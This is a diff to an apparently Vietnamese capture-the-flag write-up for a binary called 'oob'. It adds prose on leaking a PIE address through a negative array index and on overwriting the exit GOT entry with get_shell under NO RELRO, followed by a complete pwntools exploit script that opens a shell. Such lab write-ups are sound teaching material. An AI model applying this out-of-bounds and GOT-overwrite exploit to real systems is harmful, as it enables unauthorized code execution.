@@ -87,16 +87,46 @@ Lúc này nếu chuyển luồng thực thi đến lệnh in thì sẽ leak đư
     binary_leak=u64(p.recv(6)+b'\x00\x00')
     exe.address=binary_leak-0x35b0
 
-<img width="982" height="518" alt="image" src="https://github.com/user-attachments/assets/f72c4e13-6b08-491d-a098-7c0c1cd94727" />
+<img width="982" height="518" alt="Screenshot 2026-11-04 180755" src="https://github.com/user-attachments/assets/65f278c7-4bdf-41e6-baf7-f8177ca33778" />
 
 Nhìn xa hơn về trước mảng acc thì còn lưu cả các hàm thư viện. Điều này là do cơ chế bảo mật RELRO đang ở trạng thái NO RELRO. Do đó bảng GOT nằm hoàn toàn trong
 vùng có quyền `rw-`. 
 
 Vậy chỉ cần ghi đè địa chỉ trong bảng GOT thành `get_shell` để chuyển hướng tạo shell. Ở đây thì ta thường sẽ chọn hàm `exit` vì hàm này sẽ chỉ được gọi cuối chương trình, khi ta đã hoàn thành việc khai thác.
 
-<img width="982" height="518" alt="Screenshot 2026-11-04 180755" src="https://github.com/user-attachments/assets/65f278c7-4bdf-41e6-baf7-f8177ca33778" />
+    input()
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'Index: ',b'-9')
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'Enter amount: ',str(exe.sym['get_shell']).encode())
 
+# Script Python
 
+    #!/usr/bin/env python3
+    from pwn import *
+    exe=ELF('./oob',checksec=False)
+    p=process(exe.path)
+    
+    gdb.attach(p,gdbscript='''
+    	b*main+717
+    	c
+    	'''
+    )
+    input()
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'Index: ',b'-5')
+    p.sendlineafter(b'> ',b'4')
+    p.recvuntil(b'Name: ')
+    binary_leak=u64(p.recv(6)+b'\x00\x00')
+    exe.address=binary_leak-0x35b0
+    
+    input()
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'Index: ',b'-9')
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'Enter amount: ',str(exe.sym['get_shell']).encode())
+    
+    p.interactive()
 
 
 
